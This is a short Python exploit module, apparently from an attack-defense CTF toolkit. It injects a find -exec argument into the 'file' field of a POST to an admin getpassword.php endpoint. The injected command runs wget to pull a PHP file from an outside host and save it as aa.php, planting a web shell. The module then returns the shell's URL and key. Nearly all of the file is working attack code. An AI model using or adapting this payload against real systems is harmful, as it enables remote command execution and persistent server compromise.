'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from utils import Utils

self_Url = 'http://4.4.1.100/aa.txt'

class P(Payload):
    def attack(self):
        try:
            url = 'http://{0}/admin/admin/getpassword.php'.format(self.host)
            cmd = 'wget {} -O aa.php'.format(self_Url)
            res = requests.post(url,data={
                'action':'debug',
                'file':'sth -or -exec {} ; -quit'.format(cmd)
            },timeout=2)
            url2 = 'http://{0}/admin/admin/aa.php'.format(self.host)
            res =requests.get(url,timeout=2)
            if res.status_code == 200:
                return url2,'c'
            else:
                raise PayloadFailException
        except:
            raise PayloadFailException